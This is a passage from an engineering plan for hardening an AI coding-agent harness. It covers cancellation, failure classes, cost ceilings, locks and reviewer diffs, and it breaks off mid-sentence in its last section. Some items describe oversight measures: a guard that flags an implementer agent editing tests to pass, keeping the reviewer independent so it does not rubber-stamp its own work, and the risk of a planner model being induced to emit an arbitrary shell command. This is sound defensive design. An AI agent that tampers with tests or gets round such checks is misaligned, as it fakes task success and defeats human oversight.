# Agent Harness — operational hardening plan

**Status:** proposed
**Scope:** `packages/agent-harness`
**Origin:** full-package review of the run lifecycle, concurrency model, git ownership, and failure handling.

## Problem statement

The harness gets the hard architectural calls right: evidence is harness-owned, git is
harness-owned, packets are complete, every loop is bounded. The gaps are all **operational** —
what happens when a human wants to intervene, when the provider flakes, when the process dies,
when two things touch the repository at once, and when nobody is watching.

Concretely:

1. A running run cannot be cancelled. The operator's only lever is killing the process.
2. The reviewer approves changes it has never seen — it receives filenames, not a diff.
3. Every failure is flattened into one `blocked` state; `retry()` cannot tell a provider hiccup
   from a permanent contract violation.
4. Nothing enforces a spend ceiling. `maxStepsPerRun` is a proxy for cost that is off by orders
   of magnitude depending on context size.
5. The per-run lock protects `state.json`; nothing protects the *working tree*, which is the
   resource that actually conflicts.
6. A crash mid-`implementing` resumes onto a half-edited tree with no detection.
7. Steps take up to 20 minutes and surface nothing until they finish.

The through-line: **the harness is trustworthy when it runs to completion, and opaque or
unrecoverable when it does not.** This plan closes the "does not" path.

## Guiding principles for this work

- **Intervention must not queue behind the thing it interrupts.** Cancel, and any future
  intervention control, is out-of-band by construction.
- **Additive state only.** Every new `RunState` field carries a Zod `.default()`. `CONTRACT_VERSION`
  stays `"2"` — it is a `z.literal`, and bumping it makes every existing run file unparseable.
- **Classify failures at the throw site, not by regex at the render site.** The engine knows why
  something failed; the UI should not be inferring it from message text.
- **Degrade loudly in the audit, quietly in the prompt.** Every new cap and every dropped item
  lands in a persisted audit file, matching the existing `packets/*.retrieval.json` discipline.
- **A guard that only fires on success is not a guard.** Detection predicates must be independent
  of outcome.

## Phasing

Phases are ordered so that later work builds on earlier state/schema changes. Within a phase,
items are independent and can be done in any order.

| Phase | Theme | Items |
| --- | --- | --- |
| 1 | Self-contained correctness fixes | 1–6 |
| 2 | State & schema foundations | 7–8 |
| 3 | Concurrency and intervention | 9–10 |
| 4 | Git-facing and observability | 11–13 |
| 5 | Documentation | 14 |

Run `npx vitest run` in `packages/agent-harness` after each item. The suite is currently
**148 passing across 20 files**; it must stay green at every commit.

---

# Phase 1 — Self-contained correctness fixes

## 1. Unconditional test-tamper guard

**File:** `src/engine.ts` (`implementTask`, ~line 991)

The guard currently reads `if (evidence.passed && touchedTests.length > 0)`. Tampering is a
*path* fact, not an outcome fact. An implementer that rewrites a test and still fails produces no
guard evidence, no `reviewSummary` warning, and the modified test rides into the eventual commit.

**Change:** drop the `evidence.passed &&` condition. Keep the rest of the branch — the repair
path, the exhaustion check, the synthetic `guard:test-tamper` evidence entry — exactly as is.
Add `passed: evidence.passed` to the `task.implementation_test_tamper` event detail so the audit
distinguishes the two cases.

Keep pushing the real `evidence` entry *before* the synthetic guard entry, as the current code
does; `recentEvidenceOutput` selects newest-first and the guard message is what the next attempt
must read.

**Test** (`tests/unit/` — new or in an existing engine test file): implementer reports a change to
a recorded `testPaths` entry, targeted test **fails** → task step is `implementing`, a
`guard:test-tamper` evidence entry exists, and `reviewSummary` names the file.

## 2. `dropped` status for open unknowns

**Files:** `src/domain.ts`, `src/engine.ts` (`reconcileUnknowns`), `src/tracker.ts`
(`renderUnknowns`), `src/ui/app.ts`

`reconcileUnknowns` marks any prior entry absent from the griller's latest list as `resolved`.
But that list is an LLM re-emitting ~10 items every turn; omission from forgetfulness is
indistinguishable from omission because the thing is genuinely settled. The register exists to
give the interview an honest observable length, and this makes it optimistic by construction.

**Changes:**

- `OpenUnknownSchema.status` → `z.enum(["fog", "asked", "parked", "resolved", "dropped"])`,
  default still `"fog"`.
- `reconcileUnknowns`, for a prior entry **absent** from `incoming`:
  - `prior.status === "asked"` → `"resolved"` (there is an answer to point at)
  - `prior.status === "parked"` → `"parked"` (parked is sticky by design; do not drop it)
  - `prior.status === "resolved"` → `"resolved"` (idempotent)
  - otherwise (`fog`, `dropped`) → `"dropped"`
- An entry that *reappears* in `incoming` after being `dropped` re-enters the normal
  `asked`/`parked`/`fog` computation — the existing code path already handles this, since it
  derives status from `askedIds`/`parkedIds`/`prior.status`. Verify that a `dropped` prior does
  not sticky-override back to `dropped`.
- `renderUnknowns`: add a `## Dropped (griller stopped tracking)` section. Order the sections
  fog → asked → parked → dropped → resolved.
- Dashboard summary line: `"N resolved · N open · N parked · N dropped"`. `dropped` is **not**
  counted as open and **not** counted as resolved.

**Tests** (`tests/unit/reconcile-unknowns.test.ts`): a `fog` entry absent from incoming becomes
`dropped`, not `resolved`; an `asked` entry absent becomes `resolved`; a `parked` entry absent
stays `parked`; a `dropped` entry present in incoming returns to `fog`.

## 3. Per-question resolution summaries

**Files:** `src/domain.ts`, `src/engine.ts` (`grill`), `src/prompts.ts`

`engine.ts:613-618` stamps the *same* `output.summary` onto every resolution produced from a
batch. Now that batching is the default, three independent decisions collapse into one shared
rationale in `grill.md` — losing exactly the fidelity batching was meant to preserve.

**Changes:**

- Add to **both** variants of `GrillOutputSchema`:
  ```ts
  resolutionSummaries: z
    .array(z.object({ questionId: z.string().min(1), summary: z.string().min(1) }))
    .default([]),
  ```
  The griller already receives `answers: [{questionId, answer, optionId}]`
  (`engine.ts:567`), so it can echo the harness ids back.
- Update `GRILL_EXPECTED_OUTPUT` to describe the field in both branches.
- Add a `griller` role rule in `prompts.ts`: *"When you incorporate answers, return one
  `resolutionSummaries` entry per answered `questionId` — a specific statement of what that one
  answer settled. Do not reuse the same text across entries; the turn-level `summary` covers the
  turn."*
- In `grill`, build a `Map<questionId, summary>` from `output.resolutionSummaries` and use it when
  constructing each `GrillResolution`, falling back to `output.summary` when the id is absent.
  Apply the same mapping in the `ready_to_plan` branch for resolutions derived from
  `answeredQuestions`.

Note the fallback is load-bearing: a weaker model will sometimes omit the field, and that must
degrade to today's behaviour rather than fail schema validation. That is why the field carries a
`.default([])` rather than being required.

**Test** (`tests/unit/questions.test.ts` or a new file): a batch of three answers with three
distinct `resolutionSummaries` produces three `grillResolutions` with distinct `summary` values;
a batch with no `resolutionSummaries` falls back to the turn summary for all three.

## 4. Configurable test and source path classification

**Files:** `src/config.ts`, `src/engine.ts`, `src/knowledge.ts` (export only)

`isTestPath` (`engine.ts:1375`) hardcodes `tests/`, `test/`, `__tests__/`, `*.test.*`, `*.spec.*`.
`includesSourcePath` (`engine.ts:1385`) hardcodes an extension set. Deploy into a Go repo
(`foo_test.go`), a Maven repo (`src/test/java/`), or a Python repo using `spec/`, and the
test-writer's legal edits get classified illegal → `throw` → run blocked with a confusing message.
This directly undercuts the portable `deploy` story.

**Changes:**

- `src/knowledge.ts`: export the existing `matchesGlob` (line 1081). Do **not** add a glob
  dependency — the in-repo matcher already supports `**`, and reusing it keeps rule-glob and
  test-path semantics identical.
- `config.ts` → `workflow`:
  ```ts
  testPathPatterns: z.array(z.string().min(1)).default([
    "tests/**", "test/**", "**/__tests__/**",
    "**/*.test.*", "**/*.spec.*", "**/*_test.*", "src/test/**",
  ]),
  ```
- `config.ts` → `knowledge.graphify`:
  ```ts
  sourceExtensions: z.array(z.string().min(1)).default([
    ".ts", ".tsx", ".js", ".jsx", ".mjs", ".cjs", ".py", ".go", ".rs",
    ".java", ".kt", ".kts", ".cs", ".cpp", ".c", ".h", ".hpp", ".rb", ".php", ".swift",
  ]),
  ```
  It lives under `graphify` because its only consumer is the decision to rebuild the graph after
  a commit.
- `isTestPath(filePath, patterns)` and `includesSourcePath(paths, extensions)` take their config
  as a parameter. Normalise `\` → `/` before matching, as today. Extension comparison stays
  case-insensitive.
- Mirror both keys into `defaultConfigYaml()` with a short comment.
- Bump `CONFIG_VERSION` to `4` (see item 8 for how migration interacts with the config hash).

**Tests** (`tests/unit/config.test.ts` + engine test): default patterns classify `foo_test.go` and
`src/test/java/FooTest.java` as tests; a custom `testPathPatterns` of `["spec/**"]` rejects
`tests/foo.test.ts`.

## 5. Stale-lock liveness check

**Files:** `src/store.ts` (`withLock`), `src/cli.ts`

`withLock` writes `{pid}` into the lock and never reads it back, so a crashed process makes a run
unusable for 30 minutes with no escape hatch.

**Changes:**

- Write `{ pid, hostname: os.hostname(), at }` into the lock file.
- On `EEXIST`: read and parse the lock body. If parsing succeeds **and** `hostname` matches the
  local hostname, probe with `process.kill(pid, 0)`:
  - throws `ESRCH` → the holder is dead; unlink and take the lock immediately.
  - throws `EPERM` → the pid exists under another user; treat as **alive**.
  - no throw → alive; refuse as today.
- If the body is unparseable or the hostname differs, fall back to the existing 30-minute age rule.
  A pid is only meaningful on the machine that wrote it.
- Wrap the whole probe in `try/catch`; a probe failure must degrade to the age rule, never crash
  the caller.
- Add `agent-harness unlock --run-id <id> [--repo]` to `cli.ts` as an explicit operator escape
  hatch. It unlinks the run lock (and, with `--repo`, the repository lock from item 9) and prints
  what it removed. It must print the recorded pid/hostname/age before removing, so the operator
  can see whose lock they are breaking.

**Tests** (`tests/unit/reliability.test.ts`): a lock file naming a dead pid on the local hostname
is broken immediately; a lock naming the *current* process pid is refused regardless of age; an
unparseable lock younger than 30 minutes is refused.

## 6. Retained provider agent eviction

**File:** `src/agent.ts` (`createCursorBackend`)

`retainedAgents` only shrinks via `release()`, which the engine calls on episode close. In the
long-lived UI server, a run abandoned mid-grill — operator closes the tab and never answers —
retains a Cursor agent for the life of the process. Item 12 adds a second retention site
(implementer episodes), which makes this worse.

**Changes:**

- Store `{ agent, lastUsedAt: number }` instead of the bare agent.
- Add `createCursorBackend(apiKey, options?: { retainTtlMs?: number; maxRetained?: number })`,
  defaults `retainTtlMs: 60 * 60_000`, `maxRetained: 8`.
- Sweep at the top of every `run()` call: dispose and delete entries older than `retainTtlMs`.
- After inserting, if the map exceeds `maxRetained`, evict the least-recently-used entries down
  to the cap.
- Update `lastUsedAt` on every successful resume from the map.
- All eviction paths must go through `disposeAgent`. Wrap disposal in `.catch(() => undefined)` —
  a failed dispose must never fail the run that triggered the sweep.

A resumed-but-evicted session is already safe: `run()` falls back to `Agent.resume`, and then to
a fresh agent with the complete prompt (`agent.ts:505-527`). Eviction costs cache warmth, never
correctness.

**Test** (`tests/unit/` new): with `retainTtlMs: 0`, a second `run()` disposes the first retained
agent; with `maxRetained: 1`, retaining a second agent disposes the first.

---

# Phase 2 — State & schema foundations

Both items add `RunState` fields. Do them before Phase 3/4 so later work has somewhere to record
outcomes. **Every new field needs a `.default()`** so existing `state.json` files still parse.

## 7. Retriable vs. terminal failure classification

**Files:** `src/domain.ts`, `src/engine.ts`, `src/git.ts`, `src/agent.ts`, `src/ui/server.ts`,
`src/ui/app.ts`

`advance`'s catch-all (`engine.ts:183-194`) flattens a provider 503, a dirty tree, and a
`TypeError` in harness code into the same `blocked` state, and `retry()` re-enters unconditionally.
The dashboard then regex-matches the *message text* to pick remediation copy — inference on top of
information the engine already had and threw away.

**Changes:**

- New `src/errors.ts`:
  ```ts
  export type FailureKind =
    | "provider"    // transient backend/network/timeout — retry is likely to work
    | "workspace"   // dirty tree, missing graph, unreported paths — human fixes, then retry
    | "config"      // run config drift, version mismatch — retry cannot help
    | "budget"      // step/token/cost ceiling — retry only after raising the ceiling
    | "contract"    // model could not satisfy the schema after repair attempts
    | "internal";   // harness bug

  export class HarnessFailure extends Error {
    constructor(message: string, readonly kind: FailureKind, readonly retriable: boolean, options?: { cause?: unknown }) { ... }
  }

  export function classifyFailure(error: unknown): { kind: FailureKind; retriable: boolean };
  ```
  `classifyFailure` returns the error's own fields when it is a `HarnessFailure`; otherwise it
  falls back to `{ kind: "internal", retriable: false }`. Keep the existing message-pattern
  matching **only** inside this fallback, so runs blocked before this change still classify
  sensibly.

- Throw sites to convert:
  | Site | Kind | Retriable |
  | --- | --- | --- |
  | `dirtyTreeMessage` in `start` / `ensureRunBranch` | `workspace` | yes |
  | config hash mismatch, `configVersion` newer than harness (`ensureCompatibleConfiguration`) | `config` | no |
  | `commitTask` unreported paths, "produced no git changes" | `workspace` | yes |
  | agent timeout / abort / `AgentBackendRunError` | `provider` | yes |
  | schema repair exhausted (`invokePacket` final throw) | `contract` | yes |
  | task failed after attempts exhausted (`execute`) | `contract` | no |
  | `assertAcyclic`, "Build frontier is empty" | `internal` | no |
  | budget exhaustion (item 8) | `budget` | no |

- `RunStateSchema`: `blockedKind: z.string().optional()`, `blockedRetriable: z.boolean().optional()`.
  Record both on the `run.blocked` event detail as well.
- `retry(runId)` gains `options?: { force?: boolean }`. It refuses when
  `state.blockedRetriable === false` and `force` is not set, with a message naming the kind.
  `blockedRetriable === undefined` (old runs) is permissive — refusing would strand them.
- **Automatic provider retry.** In the `advance` loop, wrap `advanceOne` so that a thrown
  `HarnessFailure` with `kind === "provider"` retries in-place with exponential backoff
  (`1s, 4s, 16s`) up to `workflow.maxProviderRetries` (new config key, default `2`, max `5`).
  Record a `run.provider_retry` event per attempt with the attempt number and the error message.
  Retries do **not** consume `maxStepsPerRun` budget but **do** count toward the cost ceiling
  naturally, since usage is recomputed from session files. Exhausting the retries blocks as normal.
  A cancel request (item 10) must short-circuit the backoff wait immediately.
- UI: key remediation copy on `blockedKind` first, falling back to today's message patterns when
  the field is absent. Show a "Retry anyway" affordance only when `blockedRetriable === false`,
  wired to `force: true`, with a caution line.

**Tests** (`tests/unit/reliability.test.ts`, `tests/integration/`): a backend that throws twice
then succeeds completes the run with two `run.provider_retry` events; a backend that always throws
blocks with `blockedKind: "provider"`; `retry()` on a `config`-kind block throws without `force`
and succeeds with it.

## 8. Cost ceiling with a hard stop

**Files:** `src/domain.ts`, `src/config.ts`, `src/engine.ts`, `src/ui/server.ts`, `src/ui/app.ts`

Usage is captured per session (`agent.ts:644-657`) and summed for *display* (`app.ts:803`), but
nothing ever checks it. `maxStepsPerRun: 40` is a poor proxy — forty steps is a rounding error or
a mortgage payment depending on context size. This is table stakes for anything that runs
unattended.

**Approach: recompute, do not increment.** After each budget-consuming step, sum usage across all
`sessions/*.json` files for the run and *replace* the total on `RunState`. This is idempotent,
survives process restarts, and captures usage from failed attempts and provider retries — all of
which an increment-on-success counter would miss. A run has on the order of 50–200 session files;
reading them is negligible against an LLM call.

**Changes:**

- `RunStateSchema`:
  ```ts
  usage: z.object({
    inputTokens: z.number().nonnegative().default(0),
    outputTokens: z.number().nonnegative().default(0),
    cacheReadTokens: z.number().nonnegative().default(0),
    cacheWriteTokens: z.number().nonnegative().default(0),
    totalTokens: z.number().nonnegative().default(0),
    costUsd: z.number().nonnegative().default(0),
    invocations: z.number().int().nonnegative().default(0),
    sessionsRead: z.number().int().nonnegative().default(0),
  }).default({}),
  ```
- `config.ts` → `workflow`:
  ```ts
  maxRunTokens: z.number().int().nonnegative().default(0),   // 0 = unlimited
  maxRunCostUsd: z.number().nonnegative().default(0),        // 0 = unlimited
  ```
  → `models`:
  ```ts
  pricing: z.record(z.object({
    inputPerMillion: z.number().nonnegative(),
    outputPerMillion: z.number().nonnegative(),
    cacheReadPerMillion: z.number().nonnegative().default(0),
    cacheWritePerMillion: z.number().nonnegative().default(0),
  })).default({}),
  ```
  Tokens are the primary ceiling — they need no maintenance. Cost is opt-in and only computable
  for models present in `pricing`; sessions using an unpriced model contribute `0` to `costUsd`.
  Surface that honestly: when any session's model is unpriced, mark `costUsd` as a lower bound in
  the UI rather than presenting it as exact.
- New `HarnessEngine.accrueUsage(state): Promise<RunState>` — lists `sessions/`, reads each JSON,
  sums the `usage` block, computes `costUsd` from `models.pricing[session.model]`, and records the
  result. Use `reportedTotal` semantics (`agent.ts:665`) rather than the provider's `totalTokens`;
  the double-counting note there still applies. Skip unreadable/partial files silently — a session
  file being written concurrently must not fail the accrual.
- Call it in the `advance` loop after every step where `consumedBudget` is true, and once more
  before returning.
- **Enforce between steps, never mid-step.** Before each `advanceOne`, if a ceiling is configured
  and exceeded, throw a `HarnessFailure(..., "budget", false)` naming which ceiling, the observed
  value, and the configured limit. Never abort an in-flight agent call for budget — a half-finished
  implementer step is worse than the marginal spend.
- Raising the ceiling and retrying is the intended recovery. Because `retry()` refuses
  non-retriable blocks without `force`, and the config hash guards against config drift mid-run
  (item 9 loosens this only for path fields), the operator flow is: edit project config → the
  run's frozen snapshot still governs → so **the budget check must read the ceiling from the
  frozen run config**, and raising it requires `agent-harness retry --run-id <id> --force
  --max-run-tokens <n>`, which rewrites those two keys in the run's `config.json` snapshot and
  re-stamps `configurationHash`. Implement that flag; without it the block is a dead end.
- UI: a usage row in the run header (`total tokens · cached · cost`), a progress bar against the
  ceiling when one is set, and dedicated blocked-state remediation copy for `blockedKind:
  "budget"` offering the raise-and-retry control.

**Tests** (`tests/unit/usage.test.ts`, `tests/integration/`): a run whose fake sessions exceed
`maxRunTokens` blocks with `blockedKind: "budget"` before starting the next step; usage recomputed
twice from the same session files is unchanged (idempotence); an unpriced model contributes tokens
but `0` cost.

---

# Phase 3 — Concurrency and intervention

## 9. Repository lock

**Files:** `src/store.ts`, `src/engine.ts`, `src/cli.ts`

The UI's single FIFO queue (`server.ts:136,166`) accidentally serialises everything **within one
server process**. A CLI `advance` running alongside the UI, or two UI instances, will interleave
branch switches and `changedFiles()` reads against one shared working tree and mis-attribute file
changes across runs. The per-run lock protects `state.json`; it does not protect the resource that
actually conflicts.

**Changes:**

- `RunStore.withRepositoryLock<T>(holder: { runId: string; action: string }, work)` operating on
  `<stateDirectory>/repo.lock`. Same liveness logic as item 5 — factor the acquire/probe/break
  routine into one private helper used by both locks.
- The lock body records `{ pid, hostname, runId, action, at }` so the refusal message can say
  *which run* holds it: `"The repository is in use by run <id> (implementing) since <time>. Wait,
  or run agent-harness unlock --repo if that process is gone."`
- **Lock ordering is repository → run, always.** Any code path taking both must take them in that
  order or the two can deadlock. Add a comment saying so at both call sites.
- Acquire in `HarnessEngine.advance` around the entire loop, and in `start()` around the preflight
  + graphify + knowledge-refresh block. Do **not** hold it across `awaiting_input` — `advance`
  already returns at that point, so this falls out naturally, but assert it in a test.
- `answerMany`, `addNote`, `status`, and `cancel` must **not** take the repository lock. They touch
  no git state and must stay available while a run is executing.
- Hold time is genuinely long — a two-hour `advance` blocks every other run. That is *correct*
  given one shared working tree, and it is the honest version of what the UI queue was already
  doing. Document it in the README and point at the deferred worktree-isolation roadmap item as
  the real fix.

**Tests** (`tests/integration/`): two concurrent `advance` calls — the second fails fast with a
message naming the first run id, and does not corrupt either state file; `answerMany` succeeds
while the repository lock is held.

## 10. Out-of-band cancellation

**Files:** `src/engine.ts`, `src/agent.ts`, `src/commands.ts`, `src/store.ts`, `src/ui/server.ts`

`engine.cancel` goes through the same global FIFO as everything else (`server.ts:432`), and
`enqueue` throws 409 when a job exists for that run (`server.ts:144`). So while a run is mid-
`advance` — up to 40 steps × 20-minute timeout — the Cancel button returns 409, and if it did
enqueue it would sit behind the very work it is cancelling. `advance` also holds `withLock` for
the whole loop, so the CLI cannot cancel either.

The plumbing mostly exists: `AgentRequest.signal` is honoured end-to-end and the Cursor backend
cancels the run on abort (`agent.ts:533-536`). Only `withTimeout` can currently fire it.

**Design.** Two mechanisms, because in-process and cross-process cancellation differ:

1. **In-process, immediate.** The engine holds `private readonly activeRuns = new Map<string,
   AbortController>()`. `advance` registers a controller on entry and deletes it in `finally`.
   `cancel` aborts it, which propagates to the in-flight agent call and shell command.
2. **Cross-process, next step boundary.** `cancel` also writes `<runDir>/cancel.request`
   (lock-free, atomic, containing `{at, by}`). The `advance` loop checks for it before each
   `advanceOne` and immediately after each step returns.

**Changes:**

- **Signal plumbing.** `InvokeInput` gains `signal?: AbortSignal`. `withTimeout` composes it:
  `AbortSignal.any([external, timeoutController.signal])`. `AbortSignal.any` needs Node ≥ 20.3 —
  bump `package.json` `engines.node` to `">=20.3"` and note it in the README.
- `runCommand` gains `signal?: AbortSignal` in its options; on abort it calls the existing
  `killTree` and settles with `exitCode: 130`, `timedOut: false`, and a `cancelled: true` flag.
  Every `runCommand` call site in the engine passes the run's signal — gates and targeted tests
  are frequently the longest-running steps, so leaving them unabortable would defeat the feature.
- `cancel(runId)` no longer takes `withLock`. New sequence:
  1. Write `cancel.request`.
  2. Abort the registered controller, if any.
  3. Try to take the run lock with a short bounded wait (~5s, polling). If acquired, do the full
     transition today's `cancel` does — `closeGrillEpisode`, phase `cancelled`, record — then
     delete `cancel.request`. If not acquired, return the current state with a flag indicating the
     cancellation is *pending*; the advancing process will complete the transition.
  4. `cancel` on an already-terminal run is a no-op that deletes any stale request file.
- The `advance` loop, on seeing `cancel.request` or its own aborted signal, breaks out and performs
  the cancelled transition itself before releasing the lock, then deletes the request file.
- **The `advance` catch block must not classify an abort as `blocked`.** Check
  `controller.signal.aborted` (or the presence of `cancel.request`) first and transition to
  `cancelled`. This is the most likely thing to get wrong — an aborted provider call surfaces as
  an ordinary `AgentBackendRunError`, which item 7 classifies as `provider`/retriable, so without
  this check a cancel would trigger the automatic provider retry and then block. Guard explicitly,
  and add a test for exactly this interaction.
- The provider-retry backoff wait from item 7 must be interruptible by the same signal.
- **UI server:** route `cancel` around `enqueue` entirely — call `engine.cancel(runId)` directly
  in the request handler. Remove `cancel` from the 409 path. It is already exempt from the
  readiness check at `server.ts:389`. Return `202` with the pending flag when the transition could
  not be completed synchronously, and have the client show "Cancelling…" until the phase flips.
- Session files for an aborted invocation should record `status: "cancelled"`, not `"failed"`, so
  the audit distinguishes operator action from provider error.

**Tests** (`tests/integration/`): a fake backend that blocks on a never-resolving promise, cancelled
mid-flight → run ends `cancelled`, not `blocked`, and the backend's signal fired; cancel during a
long-running `runCommand` kills the child; a `POST /api/runs/:id` with `action: cancel` returns
2xx while another job is running for that run; cancel + provider-retry interaction does not retry.

---

# Phase 4 — Git-facing and observability

## 11. Working-tree divergence guard

**Files:** `src/git.ts`, `src/domain.ts`, `src/engine.ts`, `src/ui/`

The two crash cases that were thought about are handled — `isTaskCommitted` (`git.ts:94`) and the
TDD resume-check (`engine.ts:948`). There is no general one. Crash during `implementing` with
`tdd: false` and the run resumes onto a half-edited tree with the implementer none the wiser.

**Changes:**

- `GitService.treeFingerprint(): Promise<string>` — SHA-256 over
  `git rev-parse HEAD` + `\0` + the raw `git status --porcelain=v1 -z --untracked-files=all`
  output, with the state-directory paths filtered out exactly as `changedFiles` does. Returns a
  sentinel like `"git-disabled"` when `git.enabled` is false. Cheap; no stash, no index mutation.
- `RunStateSchema`: `treeFingerprint: z.string().optional()`.
- Re-stamp it after every step that leaves the tree in a state the harness believes it knows:
  after `writeTests`, `implementTask`, `verifyTask`, `commitTask`, and after the preflight commit.
- On `advance` entry, after acquiring locks and before the first `advanceOne`: if
  `state.treeFingerprint` is set and differs from the observed fingerprint, throw a
  `HarnessFailure(..., "workspace", true)` describing the divergence and listing the paths that
  differ from the last recorded `changedFiles`.
- **False-positive management.** `--untracked-files=all` already respects `.gitignore`, so
  gitignored build output does not count. A test run that writes a *non-ignored* untracked file
  still will. That is why the block is retriable and paired with an explicit operator control:
  add "Accept current tree and continue" to the blocked-run UI (and
  `agent-harness retry --run-id <id> --accept-tree`), which re-stamps `treeFingerprint` from the
  observed tree and clears the block. This mirrors the existing "Commit changes and retry"
  affordance and its audit-event pattern — record `run.tree_accepted` with the old and new
  fingerprints and the diverging paths.

**Tests** (`tests/integration/git.test.ts`): a run whose tree is mutated externally between
`advance` calls blocks with `blockedKind: "workspace"`; `--accept-tree` re-stamps and allows the
run to continue; a run with `git.enabled: false` never blocks on this.

## 12. Reviewer sees the diff, and the implementer keeps its context

Two related changes. **Do them in this order** — the diff is the higher-value half and has no
dependency on the episode work.

### 12a. Diff into the review packet

**Files:** `src/git.ts`, `src/config.ts`, `src/engine.ts` (`reviewTask`)

`reviewTask` (`engine.ts:1063-1083`) hands the reviewer filenames plus command output. It has repo
access and can read current file state, but it cannot see what changed and nothing anchors it to
the change. A review that cannot see the diff approves on plausibility.

**Changes:**

- `GitService.diffForPaths(paths: string[], maxCharacters: number): Promise<{ diff: string;
  omittedFiles: string[]; truncated: boolean }>`:
  1. `git add --intent-to-add -- <paths>` so newly created files appear in the diff. This mutates
     the index but not the tree, the harness owns git, and `commitTask` stages everything moments
     later anyway. Skip paths that no longer exist.
  2. `git diff HEAD -- <paths>` with `--no-color`.
  3. Budget **per file, never mid-hunk.** Split the output on `diff --git ` boundaries, keep whole
     file diffs in order until the character budget is reached, and report the rest in
     `omittedFiles`. The generic `budgetInput` truncator would slice a diff mid-line and hand the
     reviewer a corrupt patch — this is the reason for a dedicated budget.
  4. Drop any file section whose header marks it binary, listing it in `omittedFiles`.
- `config.ts` → `workflow`: `reviewDiffCharacters: z.number().int().positive().default(20_000)`.
- `reviewTask` passes `diff` and `diffOmittedFiles` in `input`, alongside the existing
  `changedFiles`. Add a `reviewer` role rule in `prompts.ts`: *"The diff is the primary evidence.
  Read the listed omitted files from disk before commenting on them."*
- Note the interaction with `inputCharacters` (24k default): a 20k diff plus the task body will
  push the packet over, and `budgetInput` will then truncate the *longest string leaf* — which is
  the diff. Either raise `inputCharacters` for the reviewer role or, preferably, have
  `reviewDiffCharacters` default to `Math.min(20_000, inputCharacters / 2)` and assert in a test
  that a full-size diff survives `buildWorkPacket` untruncated.

**Tests** (`tests/integration/git.test.ts`, `tests/unit/packet-budget.test.ts`): a new untracked
file appears in the diff; a diff over budget drops whole files and reports them in
`omittedFiles`; a budgeted diff passes through `buildWorkPacket` with no `input-budget`
truncation recorded against it.

### 12b. Implementation episodes — review findings return to the implementing agent

**Files:** `src/domain.ts`, `src/agent.ts`, `src/engine.ts`

*This was the reviewer's proposal and it is a good one, with one boundary to hold.* Today each
repair attempt spawns a **cold** implementer that re-explores the codebase from scratch, three
times per task in the worst case. Routing the review findings back into the *same* session that
wrote the code reuses that exploration and the provider's prompt cache.

**The boundary: the reviewer stays cold and independent.** Only the implementer retains a session.
An agent reviewing its own work in its own context approves nearly everything, and the independent
review is one of the harness's load-bearing guarantees. Do not "helpfully" extend session reuse to
the reviewer.

**Changes:**

- `AgentCoordinator.invokeInEpisode` currently hardcodes `mode: "plan"`. Add a `mode` parameter;
  the griller keeps `"plan"`, the implementer needs `"agent"` to edit files.
- `BuildTaskSchema`: `implementerSession: z.object({ providerSessionId: z.string().optional(),
  guidanceFingerprint: z.string().optional(), turns: z.number().int().nonnegative().default(0) })
  .optional()`.
- `implementTask` uses `invokeInEpisode` with the task's retained session, mirroring `invokeGrill`:
  pass `providerSessionId` and `previousGuidanceFingerprint`, store what comes back.
- The continuation prompt for a repair turn carries the **new authoritative input only** — the
  review findings and the latest command evidence — exactly as `renderContinuationPrompt` already
  does for the griller. The full packet remains the cold-start fallback, unchanged.
- **Release the session** when the task reaches `done` or `failed`, in `commitTask` and at every
  `status: "failed"` transition, and for all tasks on `cancel`. Item 6's TTL sweep is the safety
  net, not the mechanism.
- Context growth is already bounded: `maxImplementationAttempts` (default 3) caps the turns.
  Record `turns` anyway so the dashboard can show it.
- Because the session is an optimisation, a run resumed in a *different process* will simply
  cold-start — the retained-agent map is in-process. That is correct and needs no extra handling,
  but state a test for it so nobody later "fixes" it by persisting provider handles.

**Tests** (`tests/integration/workflow.test.ts`): a task requiring one repair invokes the
implementer twice with the same `providerSessionId` and the second call receives a continuation
prompt containing the review findings; the reviewer's `providerSessionId` differs from the
implementer's on every attempt; a task that completes releases its implementer session.

## 13. Live agent activity

**Files:** `src/agent.ts`, `src/store.ts`, `src/ui/server.ts`, `src/ui/app.ts`, `docs/ui-polling.md`

Everything is disk-polled at ~1.8s and the finest granularity is a *completed* session file. When
an implementer step takes 15 minutes the operator stares at a spinner with no idea whether the
agent is working or looping. The Cursor backend already has an `onStep` hook (`agent.ts:542`) used
only to harvest CreatePlan bodies.

**Changes:**

- `AgentRequest` gains `onStep?: (step: { type: string; toolName?: string; summary?: string }) => void`.
  In `createCursorBackend`, call it for **every** step, not just `createPlan`, while keeping the
  existing CreatePlan harvesting untouched.
- **Redact and bound at the source.** Never persist raw tool `args` — they can contain file
  contents, credentials, and multi-megabyte payloads. Emit `{ type, toolName, summary }` where
  `summary` is a ≤200-character derived description (tool name plus, for file tools, the path).
  Cap the steps file at 2,000 lines / 256 KB per session; past that, stop appending and set a
  `truncated` marker.
- `AgentCoordinator` writes each step as one line to `sessions/<sessionId>.steps.jsonl` using
  plain `appendFile` — **not** the atomic-rewrite path, which would rewrite the whole file per
  step. Add `RunStore.appendJsonl(runId, relativePath, value)` for this; it must still go through
  `resolveInsideRun`.
- The coordinator also maintains `<runDir>/activity.json` (atomic write, lock-free):
  `{ sessionId, role, model, startedAt, lastStepAt, lastStepSummary, stepCount }`, cleared when
  the invocation settles. Throttle these writes to at most one per second — a chatty agent must
  not turn into a disk-write storm.
- **UI:** extend the existing poll payload with `activity` rather than adding SSE. The polling
  architecture and its short-circuit `signature` are already carefully tuned
  (`docs/ui-polling.md`), and a 1.8s step ticker is adequate. **The `signature` must incorporate
  `activity.lastStepAt` and `stepCount`**, or unchanged-poll short-circuiting will hide exactly
  the thing being added.
- Header display while a step is in flight: `implementer · composer-2.5 · 4m12s · editing
  src/engine.ts`. The session detail view tails `steps.jsonl` in a scrollable, collapsed-by-default
  block — which must respect the existing scroll/`<details>` restoration rules in
  `docs/ui-polling.md`.
- Update `docs/ui-polling.md` with the new signature inputs and the activity block's rules.

**Tests** (`tests/unit/ui-app.test.ts`, `tests/integration/ui.test.ts`): a step emitted during a
fake run appends to `steps.jsonl` and updates `activity.json`; the poll signature changes when only
`activity` changed; tool args never appear in the persisted step line; the steps file stops growing
at the cap.

---

# Phase 5 — Documentation

## 14. Document the `testCommand` shell-execution risk

**Files:** `packages/agent-harness/README.md`, `docs/roadmap.md`

**Out of scope to fix in this plan — document only.**

`PlannerOutputSchema` accepts a free-form `testCommand` (`domain.ts:293`), `materializeTasks`
copies it verbatim (`engine.ts:1243`), and `runTargetedTest` executes it with `shell: true` and the
full `process.env` (`engine.ts:1181` → `commands.ts:21`). A planner induced to emit
